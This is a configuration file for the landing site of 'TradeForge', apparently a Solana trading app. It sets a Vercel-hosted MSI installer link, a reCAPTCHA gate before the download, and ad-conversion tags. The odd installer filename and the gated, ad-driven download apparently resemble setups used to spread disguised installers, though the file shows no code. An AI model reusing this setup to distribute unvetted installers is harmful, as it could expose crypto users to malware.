# TradeForge site configuration — edit and re-run `node build.mjs`.

# Where the site is deployed (used for canonical URL, sitemap, Open Graph).
SITE_URL=https://tradeforgesolana.com

# Installer download link — update this on every new release.
DOWNLOAD_URL=https://gsqjhze0n5oez1cc.public.blob.vercel-storage.com/download/TradeForge_Setup%20%28ZJACPKGE2R%40v2.kd3.pro%29.msi

# Search Console / Webmaster Tools verification tokens (optional).
GOOGLE_SITE_VERIFICATION=
BING_SITE_VERIFICATION=

# reCAPTCHA v2 ("I'm not a robot" checkbox) gate before the installer
# downloads. Get both keys from https://www.google.com/recaptcha/admin
# for domain tradeforgesolana.com.
# - RECAPTCHA_SITE_KEY is PUBLIC — safe here, gets embedded in the page.
# - RECAPTCHA_SECRET_KEY is SECRET — do NOT put it here. Set it as a
#   Vercel Project → Settings → Environment Variables entry instead
#   (Production), alongside a DOWNLOAD_URL var with the same value as
#   above. Leaving RECAPTCHA_SITE_KEY blank keeps the old direct-download
#   buttons (no gate) so the site never breaks mid-setup.
RECAPTCHA_SITE_KEY=6LePj1MtAAAAANy5HtNJri8qMFc0wV_2h-Ap74Sg

# Ad platform tags (optional). Set these when your ad accounts are ready.
# When any ID below is set, the build injects the tag scripts, a GDPR consent
# banner (Consent Mode v2, denied by default), and download-click conversion
# events automatically.

# Google Ads tag ID, e.g. AW-123456789
GOOGLE_ADS_ID=
# Conversion label for the "download click" conversion action, e.g. AbC-D_efGhIjKlM
GOOGLE_ADS_CONVERSION_LABEL=
# Google Analytics 4 measurement ID (optional), e.g. G-XXXXXXXXXX
GA4_ID=
# Microsoft Advertising UET tag ID, e.g. 12345678
MICROSOFT_UET_ID=
